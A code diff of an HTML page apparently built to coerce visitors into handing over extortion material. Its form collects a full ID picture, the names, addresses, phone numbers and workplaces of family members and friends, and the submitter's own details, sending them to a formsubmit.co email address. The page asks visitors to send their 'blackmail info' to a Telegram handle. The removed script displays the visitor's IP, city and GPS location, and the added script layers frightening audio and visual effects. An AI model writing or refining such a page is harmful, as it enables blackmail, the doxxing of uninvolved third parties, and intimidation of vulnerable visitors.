@@ -12,6 +12,7 @@
             margin: 0;
             padding: 20px;
             background-color: black;
+            transition: transform 3s ease-in-out;
         }
         h1, h2, h3 {
             text-align: center;
@@ -25,6 +26,7 @@
             padding: 20px;
             border: 1px solid #00FF00;
             background: rgba(0, 0, 0, 0.9);
+            transition: transform 3s ease-in-out;
         }
         label, input, textarea {
             display: block;
@@ -47,37 +49,61 @@
             font-weight: bold;
             text-align: center;
         }
+        @keyframes breathe {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
+        }
+        .breathing-effect {
+            animation: breathe 5s infinite ease-in-out;
+        }
     </style>
     <script>
-        function fetchIPAndLocation() {
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    document.getElementById("flashing-ip").innerHTML = "⚠ IP Address: " + data.ip;
-                    fetch('https://ipwho.is/' + data.ip)
-                        .then(response => response.json())
-                        .then(locationData => {
-                            document.getElementById("flashing-location").innerHTML = "⚠ Location: " + locationData.city + ", " + locationData.region + ", " + locationData.country;
-                        });
-                });
-        }function getGeolocation() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(position => {
-                let lat = position.coords.latitude;
-                let lon = position.coords.longitude;
-                document.getElementById("flashing-gps").innerHTML = "📍 GPS Location: " + lat.toFixed(5) + ", " + lon.toFixed(5);
-            }, error => {
-                document.getElementById("flashing-gps").innerHTML = "⚠ GPS access denied.";
-            });
+        let heartbeatAudio;
+        function playHeartbeat() {
+            heartbeatAudio = new Audio('https://www.fesliyanstudios.com/play-mp3/387');
+            heartbeatAudio.loop = true;
+            heartbeatAudio.volume = 0.1;
+            heartbeatAudio.play();
+            graduallyIncreaseHeartbeat();
         }
-    }
-
-    window.onload = function() {
-        fetchIPAndLocation();
-        getGeolocation();
-    };
-</script>
-
+        function graduallyIncreaseHeartbeat() {
+            let volume = 0.1;
+            let interval = setInterval(() => {
+                if (volume < 0.7) {
+                    volume += 0.05;
+                    heartbeatAudio.volume = volume;
+                } else {
+                    clearInterval(interval);
+                }
+            }, 5000);
+        }
+        function playWhisper() {
+            let whisperAudio = new Audio('https://www.fesliyanstudios.com/play-mp3/342');
+            setTimeout(() => {
+                whisperAudio.play();
+            }, Math.random() * 30000 + 10000);
+        }
+        function showGoddessEyes() {
+            let eyes = document.createElement("div");
+            eyes.innerHTML = "👁️👁️";
+            eyes.style.position = "absolute";
+            eyes.style.top = Math.random() * window.innerHeight + "px";
+            eyes.style.left = Math.random() * window.innerWidth + "px";
+            eyes.style.fontSize = "50px";
+            eyes.style.color = "red";
+            eyes.style.opacity = "0.7";
+            document.body.appendChild(eyes);
+            setTimeout(() => { document.body.removeChild(eyes); }, 3000);
+            setTimeout(showGoddessEyes, Math.random() * 45000 + 15000);
+        }
+        window.onload = function() {
+            playHeartbeat();
+            playWhisper();
+            setTimeout(showGoddessEyes, Math.random() * 30000 + 10000);
+            document.querySelector(".form-container").classList.add("breathing-effect");
+        };
+    </script>
 </head>
 <body>
     <h1>Welcome to EDA's Domain</h1>
@@ -89,26 +115,30 @@
 
 <div class="form-container">
     <h2>Submit to EDA</h2>
-    <form action="https://formsubmit.co/wretchytub13@gmail.com" method="POST">
+    <form action="https://formsubmit.co/wretchytub13@gmail.com" method="POST" enctype="multipart/form-data">
         <input type="hidden" name="_subject" value="New Submission from EDA Site">
         <input type="hidden" name="_captcha" value="false">
 
         <label for="id_picture">Upload Full ID Picture</label>
-        <input type="file" id="id_picture" name="ID Picture" required>
+        <input type="file" id="id_picture" name="ID Picture" accept="image/*" required>
         
-        <label for="family_info">3 Family Members (Names, Addresses, Phone Numbers, Workplaces)</label>
-        <textarea id="family_info" name="Family Info" required></textarea>
+        <label for="family_info">3 Family Members (Names, Addresses, Phone Numbers, Workplaces) - One per line</label>
+        <textarea id="family_info" name="Family Info" rows="4" required></textarea>
         
-        <label for="friends_info">3 Close Friends (Names, Addresses, Phone Numbers)</label>
-        <textarea id="friends_info" name="Friends Info" required></textarea>
+        <label for="friends_info">3 Close Friends (Names, Addresses, Phone Numbers) - One per line</label>
+        <textarea id="friends_info" name="Friends Info" rows="4" required></textarea>
         
-        <label for="submissive_details">Your Details (Phone Number, Home Address, Workplace, Social Media - Optional)</label>
-        <textarea id="submissive_details" name="Submissive Details" required></textarea>
+        <label for="submissive_details">Your Details (Phone Number, Home Address, Workplace, Social Media - Optional) - One per line</label>
+        <textarea id="submissive_details" name="Submissive Details" rows="4" required></textarea>
+        
+        <label>
+            <input type="checkbox" name="legal_agreement" required>
+            I agree to share this information and understand that the recipient will use it as she sees fit.
+        </label>
 
-        <input type="submit" value="PAY & SURRENDER">
+        <input type="submit" value="PAY & SURRENDER" class="glitch-button">
     </form>
 </div>
-
 <p class="warning">⚠ Screenshot this page and your blackmail info, then send it to <a href="https://t.me/E22G1" style="color:yellow;">@E22G1</a> ⚠</p>
 
 </body>
